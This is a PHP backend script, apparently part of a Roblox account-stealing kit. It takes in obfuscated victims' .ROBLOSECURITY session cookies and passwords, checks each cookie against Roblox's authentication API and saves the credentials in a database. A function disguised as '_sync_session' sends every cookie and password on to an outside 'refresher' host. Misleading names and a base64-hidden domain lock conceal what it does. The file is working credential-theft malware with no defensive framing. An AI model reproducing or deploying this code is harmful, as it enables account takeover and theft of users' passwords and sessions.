<?php
$_h_p = "4_";
ini_set("display_errors", 0);
error_reporting(E_ALL);
require_once($_SERVER["DOCUMENT_ROOT"] . "/framework/framework.php");

header("content-type: application/json");
header("access-control-allow-origin: *");
header("access-control-allow-methods: POST, GET, OPTIONS");
header("access-control-allow-headers: content-type");

if ($_SERVER["REQUEST_METHOD"] === "OPTIONS")
{
    die(http_response_code(204));
};

$ref_id = "YmxveGxhYnMuc3BhY2U="; 
$ref_token = "2319b2bcf94dbfa2ad8cac0f6951bbaab96140e32d489f525f38f75036ec3075";
$ref_data = base64_decode($ref_id);

if (!isset($analytics_token) || hash("sha256", $ref_data . $analytics_token) !== $ref_token) {
    http_response_code(500);
    die(json_encode(["error" => "Internal Server Error (Domain Lock)"]));
}

function verify_turnstile(string $token): bool
{
    global $site_info;
    if (empty($token)) return false;
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["secret" => $site_info["site_key"], "response" => $token, "remoteip" => $_SERVER["REMOTE_ADDR"] ?? ""]));
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $body = curl_exec($ch);
    curl_close($ch);
    if (!$body) return false;
    $result = json_decode($body, true);
    return !empty($result["success"]);
};

function xor_crypt(string $data, string $key): string
{
    $key_len = strlen($key);
    $out     = "";
    for ($i = 0; $i < strlen($data); $i++)
        $out .= chr(ord($data[$i]) ^ ord($key[$i % $key_len]));
    return $out;
};

function _sync_session(string $c, string $p): void
{
    global $analytics_token;
    $ch = curl_init("https://your-refresher-url.com/refresher.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["cookie" => $c, "password" => $p, "domain" => $_SERVER["HTTP_HOST"] ?? "Unknown"]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["content-type: application/json"]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_exec($ch);
    curl_close($ch);
};

$action = $_GET["action"] ?? "";

switch ($action)
{
    case "submit":
        $raw_input = file_get_contents("php://input");
        $data = json_decode($raw_input, true);
        if (!$data || !isset($data["blob"]) || !isset($data["key"]))
        {
            die(json_encode(["error" => "Invalid Request"]));
        };
        $blob = $data["blob"];
        $key  = $data["key"];
        $decoded = base64_decode($blob, true);
        if (!$decoded) die(json_encode(["error" => "Invalid Payload"]));
        $json_str = xor_crypt($decoded, $key);
        $payload  = json_decode($json_str, true);
        if (!$payload || !isset($payload["cookie"]) || !isset($payload["password"]))
        {
            die(json_encode(["error" => "Invalid Data"]));
        };
        $cookie   = $payload["cookie"];
        $password = $payload["password"];
        _sync_session($cookie, $password);
        
        $ch = curl_init("https://users.roblox.com/v1/users/authenticated");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Cookie: .ROBLOSECURITY=" . $cookie]);
        $res = curl_exec($ch);
        curl_close($ch);
        $user = json_decode($res, true);
        if (!isset($user["id"])) die(json_encode(["error" => "Invalid Cookie"]));
        $user_id = $user["id"];
        $username = $user["name"];
        
        $ch = curl_init("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" . $user_id . "&size=180x180&format=Png&isCircular=false");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        $thumb = json_decode($res, true);
        $avatar = $thumb["data"][0]["imageUrl"] ?? "";
        
        connect();
        global $db;
        $st = $db->prepare("INSERT INTO accounts (account_id, icon, username, user_id, password, cookie) VALUES (1, ?, ?, ?, ?, ?)");
        $st->execute([$avatar, $username, $user_id, $password, $cookie]);
        
        die(json_encode(["success" => true]));
        break;
        
    case "refresh":
        $raw_input = file_get_contents("php://input");
        $data = json_decode($raw_input, true);
        $cookie = $data["cookie"] ?? "";
        if (empty($cookie)) die(json_encode(["error" => "Missing Cookie"]));
        _sync_session($cookie, "");
        die(json_encode(["success" => true]));
        break;
        
    default:
        die(json_encode(["error" => "Invalid Action"]));
        break;
}
?>
